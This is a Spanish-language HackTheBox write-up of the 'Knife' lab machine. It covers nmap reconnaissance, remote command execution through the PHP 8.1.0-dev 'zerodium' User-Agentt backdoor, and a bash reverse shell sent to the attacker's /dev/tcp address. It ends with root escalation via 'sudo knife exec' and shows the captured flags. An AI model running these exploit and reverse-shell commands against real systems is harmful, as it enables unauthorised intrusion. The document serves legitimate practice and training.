# WriteUp HackTheBox Knife

[Nota]: esta maquina fue realizada según el WriteUp realizado por S4vitar

## Descripción de la máquina

![Knife_Image](Images/Knife.png)

La resolución de la máquina presenta las siguiente fases:

* Reconocimiento
    * nmap
* Explotación
* Escalada de privilegios

## Fase de Reconocimiento

Se realiza una prueba de ping para confirmar que haya conexión con la máquina

> ping 10.10.10.242 -c1

```console
PING 10.10.10.242 (10.10.10.242) 56(84) bytes of data.
64 bytes from 10.10.10.242: icmp_seq=1 ttl=63 time=135 ms

--- 10.10.10.242 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 135.485/135.485/135.485/0.000 ms
```

Para identificar el sistema operativo usamos la utilidad proporcionada por S4vitar whichSystem.py[^1]

[^1]: la utilidad se puede descargar de <https://github.com/Akronox/WichSystem.py>

> whichSystem.py 10.10.10.242

```console
10.10.10.242 (ttl -> 63): Linux
```

Se realiza una revisión de puertos con nmap con las siguientes opciones

* -p-: Para realizar el escaneo en todos los 65000 puertos TCP
* --open: Para reportar solamente los puertos que se encuentran abiertos
* -sS: TCP SYN port scan, este argumento se utiliza para realizar un escaneo rapido de puertos
* --min-rate: El argumento le exige a nmap realizar el escaneo con una tasa de paquetes por segundo no menor a la solicitada
* -vvv: triple verbose para mostrar más información
* -n: para que no realice resolución dns en el scaneo
* -Pn: Desabilita el descubrimiento del host a traves de ping
* -oG: exporta lo reportado en un archivo en formato grepeable

> sudo nmap -p- --open -sS --min-rate 5000 -vvv -Pn 10.10.10.242 -oG nmap/allPorts

```console
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-23 01:24 -04
Initiating Parallel DNS resolution of 1 host. at 01:24
Completed Parallel DNS resolution of 1 host. at 01:24, 0.10s elapsed
DNS resolution of 1 IPs took 0.10s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 01:24
Scanning 10.10.10.242 [65535 ports]
Discovered open port 22/tcp on 10.10.10.242
Discovered open port 80/tcp on 10.10.10.242
Completed SYN Stealth Scan at 01:25, 13.69s elapsed (65535 total ports)
Nmap scan report for 10.10.10.242
Host is up, received user-set (0.14s latency).
Scanned at 2022-08-23 01:24:46 -04 for 14s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.93 seconds
           Raw packets sent: 67063 (2.951MB) | Rcvd: 66927 (2.677MB)
```

Por comodidad usamos la utilidad proporcionada por S4vitar extractPorts la cual nos ayuda a revisar el archivo creado por nmap 'all Ports' y nos copia los puertos en la clipboard para su posterior uso; se adjunta la utilidad a continuación

```console
extractPorts () {
        ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')"
        ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)"
        echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
        echo -e "\t[*] IP Address: $ip_address" >> extractPorts.tmp
        echo -e "\t[*] Open ports: $ports\n" >> extractPorts.tmp
        echo $ports | tr -d '\n' | xclip -sel clip
        echo -e "[*] Ports copied to clipboard\n" >> extractPorts.tmp
        /bin/bat extractPorts.tmp
        rm extractPorts.tmp

```
> extracPorts nmap/allPorts

```console
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.10.242
   5   │     [*] Open ports: 22,80
   6   │ 
   7   │ [*] Ports copied to clipboard
   8   │ 
```

Se realiza un nuevo escaneo con una serie de scripts básicos que nmap nos ofrece para ver las técnologias que corren por detrás

> nmap -sCV -p22,80  10.10.10.242 -oN nmap/targeted 

```console
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-23 01:26 -04
Nmap scan report for 10.10.10.242
Host is up (0.14s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title:  Emergent Medical Idea
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.62 seconds
```

Realizando un whatweb observamos que tienen un PHP/8.1.0-dev que tiene una explotación https://www.exploit-db.com/exploits/49933

> whatweb 10.10.10.242

```console
http://10.10.10.242 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.242], PHP[8.1.0-dev], Script, Title[Emergent Medical Idea], X-Powered-By[PHP/8.1.0-dev]
```

# Fase de Explotación
Realizamos un curl 

> curl -s -X GET http://10.10.10.242 -H "User-Agentt: zerodiumsystem('whoami');" | html2text

```console
james
    * About EMA
    * /
    * Patients
    * /
    * Hospitals
    * /
    * Providers
    * /
    * E-MSO

***** At EMA we're taking care to a whole new level . . . *****
****** Taking care of our  ******
```

> curl -s -X GET http://10.10.10.242 -H "User-Agentt: zerodiumsystem('id');" | html2text

```console
uid=1000(james) gid=1000(james) groups=1000(james)
    * About EMA
    * /
    * Patients
    * /
    * Hospitals
    * /
    * Providers
    * /
    * E-MSO

***** At EMA we're taking care to a whole new level . . . *****
****** Taking care of our  ******
```

Dado que tenemos ejecución remota de comandos nos ponemos en escucha en el puerto 443

> curl -s -X GET http://10.10.10.242 -H "User-Agentt: zerodiumsystem('bash -c \"bash -i >& /dev/tcp/10.10.14.4/443 0>&1\"');" | html2text

> udo nc -nlvp 443
```console
[sudo] password for mzapata: 
listening on [any] 443 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.242] 40752
bash: cannot set terminal process group (978): Inappropriate ioctl for device
bash: no job control in this shell
james@knife:/$ 
```

Pasamos a arreglar la consola

1. script /dev/null -c bash
2. `ctrl` + `Z`
3. stty raw -echo; fg
4. reset xterm
5. export SHELL-/bin/bash
6. export TERM=xterm
7. stty rows columns

y ya se podría ver la flag de user

> cd
>
> cat user.txt

```console
5023bbd9e188e35f2ec126a4d5a79fb3
```

## Fase de Escalación de privilegios

> james@knife:~$ sudo -l

```console
Matching Defaults entries for james on knife:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```

Vemos que podemos ejecutar el binario knife como sudo sin utilizar password y vemos una manera de ejecutar comandos en la siguiente página <https://gtfobins.github.io/gtfobins/knife/#sudo>

> sudo -u root knife exec -E 'exec "/bin/sh"'

```console
whoami
root
```

y ya podríamos ver la flag de root

> bash
>
> cat /root/root.txt

```
91df0568aed84d29a601d17bbd164022
```

## Estructura del directorio

```
Knife
├── content
├── exploits
├── Images
├── nmap
│   ├── allPorts
│   └── targeted
├── Readme.md
└── scripts
```


